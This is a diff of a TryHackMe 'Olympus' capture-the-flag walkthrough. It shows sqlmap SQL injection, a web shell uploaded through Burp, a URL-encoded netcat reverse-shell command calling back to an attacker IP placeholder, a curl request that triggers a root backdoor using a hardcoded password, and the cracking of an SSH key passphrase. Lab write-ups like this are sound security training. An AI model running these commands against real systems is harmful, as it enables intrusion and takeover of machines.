@@ -1,6 +1,6 @@
 ---
 title: "TryHackMe: Olympus"
-date: 17 Jul 2022 @ 0707
+date: 19 Jul 2022 @ 0707
 excerpt_separator: "<!--more-->"
 categories:
   - Walkthrough
@@ -66,7 +66,7 @@ There's a directory `~webmaster` that returns a 301 HTTP code ("Moved Permanentl
 ![](/assets/images/Pasted%20image%2020220717075646.png)
 
 ## SQL Injection
-After poking around the site for a bit, we find a `credentials.php` page that looks like it might be making a call to a backend database. We can run that through `sqlmap` to see if anything comes back. 
+After poking around the site for a bit, we find a `category.php` page that looks like it might be making a call to a backend database. We can run that through `sqlmap` to see if anything comes back. 
 
 ```bash
 $ sqlmap -u 'http://olympus.thm/~webmaster/category.php?cat_id=1' -p 'cat_id' --dbs                     
@@ -95,6 +95,8 @@ Awesome! So the `cat_id` parameter was vulnerable to SQL injection, and we can n
 - Use `--tables` to enumerate table names. Specify tables on the command line with `-T <TABLE NAME>`
 - Use `--columns` to enumerate column names within a table. Specify columns with `-C <COLUMN NAME>`. 
 - You can also dump the entire table useing `--dump`. 
+
+>**NOTE:** The search field is also vulnerable to SQLi. 
 
 ### Flag #1
 When we dig into the `olympus` database, we can see there's a table named `flag` there. We can dump that table to get the contents of Flag #1. 
@@ -213,6 +215,8 @@ $ sqlmap -u 'http://olympus.thm/~webmaster/category.php?cat_id=1' -p 'cat_id' -D
 
 Now we just need to figure out if there are any filters in place that would prevent us from uploading a web shell to the server. **SPOILER ALERT: There aren't!**
 
+>**NOTE:** I originally intened this to show how to use Burp to test for file upload filters, but since there weren't any it became just another way to get a web shell on the box. This is probably the "hard" way. Since there are no filters in place, you *could* just upload a full PHP reverse shell to the server, access that and get a reverse shell from there. But...I didn't. 
+
 To get a webshell on server, uploaded a normal image using the file upload functionality on the chat page, intercepted the request with Burp and sent the request to the Burp Repeater. In the repeater tab I did the following:
 
 ![](/assets/images/Pasted%20image%2020220717113111.png)
@@ -252,6 +256,8 @@ Make sure to URL-encode the payload and start up a netcat listener on your attac
 ```bash
 $ curl 'http://chat.olympus.thm/uploads/1b3093a1fca202e92445397dc4cc8c85.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%20<ATTACKER IP>%20<LISTEN PORT>%20%3E%2Ftmp%2Ff'
 ```
+
+>**NOTE:** You could also send this request in a web browser if it's easier for you. 
 
 ![](assets/images/Pasted%20image%2020220717114938.png)
 After stabilizing that shell we can do some enumeration and figure out how to move from `www-data` to a normal user. Looking at the `/home` directory and `/etc/passwd`, it looks like our user will be `zeus`...which makes sense because we also saw that user in the MySQL database. 
@@ -322,7 +328,7 @@ Looks like the key requires a passphrase. We can use `ssh2john` to get the key i
 $ python3 /opt/john/run/ssh2john.py zeus.key > zeus.hash
 ```
 
-> **NOTE:** Depending on your distribution and how you have `john` installed, your command may be slightly different than mine. 
+>**NOTE:** Depending on your distribution and how you have `john` installed, your command may be slightly different than mine. 
 
 Now that we've got it in a good format, we can try using `john` to crack the hash. 
 
@@ -371,7 +377,7 @@ zeus@olympus:~$ ls
 snap  user.flag  zeus.txt
 ```
 
-There's also a note `zeus.txt`. It looks like a taunt from Prometheus about being able to hack his way in. Oh, Prometheus. 
+There's also a note `zeus.txt`. It looks like a taunt from Prometheus about being able to hack his way in and establish persistence. Oh, Prometheus. 
 
 ```text
 zeus@olympus:~$ cat zeus.txt 
@@ -418,15 +424,17 @@ $ip = $_GET["ip"]; $port = $_GET["port"];
 [...]
 ```
 
-Alright...it looks like this is a root backdoor! Let's try to breakdown what's happening here in the first few lines of this code.
+Alright...it looks like this is a root backdoor! This must be what Prometheus was blabbering about. Let's try to breakdown what's happening here in the first few lines of this code.
 
-> **Disclaimer:** I am by no means a professional PHP developer, so sorry if my explanation is a little off. 
+>**Disclaimer:** I am by no means a professional PHP developer, so sorry if my explanation is a little off. 
 
 So it looks like this application is listening for an HTTP POST request with the password in the body of the request, and the target (in this case, the attacker's) IP and PORT as GET parameters. We can leverage this backdoor with the following command.
 
 ```bash
 $ curl -X POST "http://$ip/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php?ip=<ATTACKER IP>&port=<LISTEN PORT>" -H "Content-Type: application/x-www-form-urlencoded" -d "password=a7c5ffcf139742f52a5267c4a0674129"
 ```
+
+>**NOTE:** This can also be done by visiting the site in a web browser. I used curl for ease of illustration, but a browser would work just fine. You'll still have to include the attacker IP and listening port in the query string though. 
 
 Which gets us a root shell!
 
@@ -498,11 +506,12 @@ PS : Prometheus left a hidden flag, try and find it ! I recommend logging as roo
 Prometheus, you're killin' me. 
 
 ## Bonus Flag
-The root flag suggested using regex to find the bonus flag. I'm going to use a simple `grep` command with some options to find the bonus flag. Using the hint provided in the room, we know that the bonus flag is somewhere in the `/etc` directory. 
+The root flag suggested using regex to find the bonus flag. I'm going to use a simple `grep` command with some options to find the bonus flag. Using the hint provided in the room, we know that the bonus flag is somewhere in the `/etc` directory. We also know the flags have the format `flag{s0m3th1ng}`. We can use those two pieces of information to construct the query. 
 
 ```bash
 root@olympus:~# grep -irl flag{ /etc/
-/etc/ssl/private/.b0nus.fl4g
+
+/PATH/IS/REDACTED
 ```
 
 We can break this command down quickly before you grab that flag and finish the room. 
